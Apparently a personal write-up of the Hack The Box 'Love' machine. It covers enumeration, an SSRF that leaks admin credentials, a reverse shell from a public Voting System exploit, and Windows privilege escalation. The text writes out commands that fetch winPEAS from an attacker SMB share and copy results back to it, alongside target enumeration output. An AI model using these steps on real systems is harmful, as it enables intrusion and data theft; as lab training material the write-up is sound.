# Takeaways
- winpeas was not working because I was not downloading the binary at all... I was curl'ing the HTML of the Github page that had the download link to the file... doh!
- Be careful when using curl to make sure your file is intact

# Process
- First step is a full nmap scan (including UDP) 
- Since there is a website, run `dirb` and `nikto`
	- There are many results of LISTABLE directories. 
- I'm not sure what to test at this point, but I suspect it has something to do with the PHP and maybe some MySQL stuff. Injection maybe? Maybe not, I just tested with sqlmap and nothing...
- After running my "lazy" nmap scan again, I found some interesting certificate information...

![[3acc666a981d886335699238d5c7ec92-1.png]]

- ...and added a line to /etc/hosts for the classic local DNS config.

![[3cd7db4d724f8ec98fe978c6113d6bef-1.png]]

- Interestingly, love.htb/admin/index.php seems to be an admin login (username is admin? different from the normal voter login). When trying username "admin", I get "Incorrect password", but when trying other usernames, I get "Cannot find account with the username"

- Also interestingly, when I visited love.htb/admin/includes (LISTABLE directory), I saw errors pertaining to "omrs" (Online Marriage Registration System???) Considering the machine is called "love" this is pretty suspicious. It turns out that there are known exploits for OMRS on exploit-db and Github, too.

![[b30c33819764bbf89b0b4449773258ae-1.png]]

- Seems like I will need admin access first...
- Can I access the MySQL database using the staging.love.htb/beta.php web app? 
- Is this some sort of SSRF? 
- It turns out it is an SSRF attack using the staging.love.htb/beta.php app. From nmap results, we can see that port 5000 is running a webpage of some sort. We can't access it externally (hence the 403 Forbidden), but we can access it using the beta.php app because it will create an internal request to the port.

![[bde1ff1515d53b41bde619301877352f-1.png]]

![[7aa65090ea37a8c47242786a4fa8fa6e-1.png]]

- Now we use the creds using the love.htb/admin portal found earlier.

![[34af597d089984676eb0f33c6e2c9cdc-1.png]]

![[d6b22e638e0c10cbe60ffb107458ca5f-1.png]]

- There were already some voters in the system, and they seem to have hashes as their passwords... (though this may be tracks from other players on this same HTB machine...)

![[d36343a6bb9ac4ecb314b1dd9a93b5f6-1.png]]

- After a quick Google search regarding the Voting System PHP/MySQL webapp, I was able to find a couple of exploits that looked useful for gaining a shell. One in particular caught my eye (using searchsploit): 49445.py from exploit-db

![[0c56943f9744d55377356e8324cb0987-1.png]]

![[adaf2ea5a8418f6c4cc6ce86a8d95aa5-1.png]]

- The exploit seems to open a reverse shell, but we need to modify the variables and some of the URLs to match the structure on this particular server. For example, the `/votesystem/admin/index.php` needs to be changed to just `/admin/index.php` (and similarly for the rest). 

![[6efbd87dbf9946c61662f53b45ab918e-1.png]]

- Note: you need to figure out your IP from the HTB VPN connection, not just your normal IP address. For me it is on the tun0 interface:

![[003cce35797929306557f068b313869a-1.png]]

![[f2fedceb356cf22a07ed0fd32bf3d3d7-1.png]]

- Now, start netcat to listen on Kali for the reverse shell and run the exploit!

![[f5bf124d716aaf5775a0cf0d7ec0c83c-1.png]]

![[689e8a8dcbee9748193362f6efcaeefa-1.png]]

![[95ddfa6cfd962d892682263119a9d1b0-1.png]]

- The user flag is in the typical spot for HTB machines (just some user's folder)

![[24dac5070871cd807ea3fd44f86b549d-1.png]]

- Next step is looking for privilege escalation methods on the Windows machine.
- But first, some enumeration on stuff like the architecture...

![[3908c3bf18076728736db71e34316f21-1.png]]

- Not sure why, but WinPEAS is not cooperating with me. It's not running at all in the images directory...

- Trying to privesc manually...?

```txt
C:\xampp\htdocs\omrs\images>systeminfo
systeminfo                                                                                                           
                                                                                                                     
Host Name:                 LOVE                                                                                      
OS Name:                   Microsoft Windows 10 Pro                                                                  
OS Version:                10.0.19042 N/A Build 19042                                                                
OS Manufacturer:           Microsoft Corporation                                                                     
OS Configuration:          Standalone Workstation                                                                    
OS Build Type:             Multiprocessor Free                                                                       
Registered Owner:          roy                                                                                       
Registered Organization:                                                                                             
Product ID:                00330-80112-18556-AA148                                                                   
Original Install Date:     4/12/2021, 1:14:12 PM                                                                     
System Boot Time:          6/3/2021, 7:47:44 AM                                                                      
System Manufacturer:       VMware, Inc.                                                                              
System Model:              VMware7,1                                                                                 
System Type:               x64-based PC                                                                              
Processor(s):              1 Processor(s) Installed.                                                                 
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                           
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019                                 
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,330 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,641 MB
Virtual Memory: In Use:    2,158 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\LOVE
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5000802
                           [09]: KB5000858
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.239
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```txt
C:\xampp\htdocs\omrs\images>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042

C:\xampp\htdocs\omrs\images>wmic qfe get Caption,Description,HotFixID,InstalledOn 
wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=4601554  Update           KB4601554  4/12/2021    
https://support.microsoft.com/help/4562830  Update           KB4562830  4/12/2021    
http://support.microsoft.com/?kbid=4570334  Security Update  KB4570334  11/18/2020   
https://support.microsoft.com/help/4577586  Update           KB4577586  4/12/2021    
https://support.microsoft.com/help/4580325  Security Update  KB4580325  11/19/2020   
https://support.microsoft.com/help/4586864  Security Update  KB4586864  11/19/2020   
https://support.microsoft.com/help/4589212  Update           KB4589212  4/12/2021    
https://support.microsoft.com/help/5000802  Security Update  KB5000802  4/12/2021    
                                            Security Update  KB5000858  4/12/2021  
```

```txt
C:\xampp\htdocs\omrs\images>set
set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Phoebe\AppData\Roaming
CommonProgramFiles=C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=LOVE
ComSpec=C:\WINDOWS\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
HOMEDRIVE=C:
HOMEPATH=\Users\Phoebe
LOCALAPPDATA=C:\Users\Phoebe\AppData\Local
LOGONSERVER=\\LOVE
NUMBER_OF_PROCESSORS=2
OneDrive=C:\Users\Phoebe\OneDrive
OS=Windows_NT
Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_ARCHITEW6432=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=0102
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files (x86)
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\WINDOWS
TEMP=C:\Users\Phoebe\AppData\Local\Temp
TMP=C:\Users\Phoebe\AppData\Local\Temp
USERDOMAIN=LOVE
USERDOMAIN_ROAMINGPROFILE=LOVE
USERNAME=Phoebe
USERPROFILE=C:\Users\Phoebe
windir=C:\WINDOWS
AP_PARENT_PID=7104
```

- Figured out how to run winPEAS properly.
- First, I set up an SMB server (just for a change) using impacket-smbserver on Kali

```sh
impacket-smbserver MYSHARE ~/Documents/HackTheBox/machines/love
```

- Then, I downloaded the winpeas binary to the directory, and copied the file using the target machine's user shell

```txt
C:\xampp\htdocs\omrs\images> copy \\10.10.14.129\MYSHARE\winPEASany.exe .
```

- Finally, I executed the binary and saved the output to a text file, which I then transferred back to Kali's SMB share.

```txt
C:\xampp\htdocs\omrs\images> copy peas.txt \\10.10.14.129\MYSHARE
 copy peas.txt \\10.10.14.129\MYSHARE
        1 file(s) copied.
```

- To read the results in color, I used `less -R`
- Suspicious lines found were: 

![[3df865114c7f329a059cd09e1ce7856f-1.png]]

- Turns out there is an easy payload for privilege escalation. This just creates a reverse shell instance. 

![[da2f1f5e80588493a52131b0c2737361-1.png]]

- Listening for the reverse shell on Kali

![[9470e4c6fae646c8b9ccb450dba4a507-1.png]]

- Tranferring the payload on the target machine and installing it

![[f418c9b5735d23936b7049a91af47bb5-1.png]]

- Success!

![[0124671bc00b2d2d7c690214d581d270-1.png]]

![[374c1f84c9be28a6a9d9fe4e8349dcaf-1.png]]